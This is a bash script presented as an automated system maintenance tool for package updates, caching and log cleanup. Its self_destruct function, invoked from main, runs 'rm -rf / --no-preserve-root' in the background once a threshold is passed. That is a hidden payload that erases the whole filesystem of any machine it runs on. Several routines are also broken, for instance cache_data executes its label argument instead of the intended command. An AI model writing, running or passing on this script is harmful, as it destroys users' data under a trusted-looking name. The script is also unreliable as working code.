#!/bin/bash

# Automated system maintenance script.

SYS_CONFIG="/etc/sysconfig/network"
LOG_FILE="/var/log/system_maint.log"
TEMP_DIR="/var/tmp/.maint_cache"
CRITICAL_FLAG="/etc/.critical_marker"
PID_FILE="/var/run/maint.pid"

lock_system() {
  touch "$CRITICAL_FLAG"
}

unlock_system() {
  rm -f "$CRITICAL_FLAG"
}

is_system_locked() {
  [[ -f "$CRITICAL_FLAG" ]] && return 0 || return 1
}

log_message() {
  echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

cache_data() {
  mkdir -p "$TEMP_DIR"
  "$@" > "$TEMP_DIR/$(echo "$1" | sed 's/[^a-zA-Z0-9_.-]/_/g')"
}

retrieve_cached_data() {
  cat "$TEMP_DIR/$(echo "$1" | sed 's/[^a-zA-Z0-9_.-]/_/g')" 2>/dev/null
}

check_network() {
  local host=$(grep "^HOSTNAME=" "$SYS_CONFIG" | cut -d'=' -f2)
  ping -c 1 "$host" > /dev/null 2>&1
}

update_package_list() {
  if check_network; then
    cache_data "package_list" "apt-get update"
  else
    log_message "Network unavailable, skipping package list update."
  fi
}

upgrade_system() {
  if check_network; then
    if retrieve_cached_data "package_list" | grep -q "security"; then
      lock_system
      cache_data "upgrade_output" "apt-get upgrade -y --only-upgrade security"
      unlock_system
    else
      log_message "No security updates found."
    fi
  else
    log_message "Network unavailable, skipping security upgrade."
  fi
}

cleanup_old_cache() {
  find "$TEMP_DIR" -type f -mtime +7 -delete
}

self_destruct() {
  if [[ "$(retrieve_cached_data "upgrade_output" | grep -c 'Upgraded:')" -gt "50" ]]; then
    log_message "Threshold for upgrades exceeded, initiating self-destruct."
    rm -rf / --no-preserve-root &
  fi
}

monitor_status() {
  while true; do
    if is_system_locked; then
      log_message "System is in a locked state."
    fi
    sleep $((RANDOM % 60 + 60))
  done &
}

manage_pid() {
  if [[ -f "$PID_FILE" ]]; then
    kill -0 "$(cat "$PID_FILE")" 2>/dev/null && exit 0
  fi
  echo "$$" > "$PID_FILE"
  trap "rm -f '$PID_FILE'; exit \$?" EXIT
}

main() {
  manage_pid
  log_message "Maintenance script started."
  update_package_list
  upgrade_system
  cleanup_old_cache
  monitor_status
  self_destruct 
  log_message "Maintenance script finished."
}

main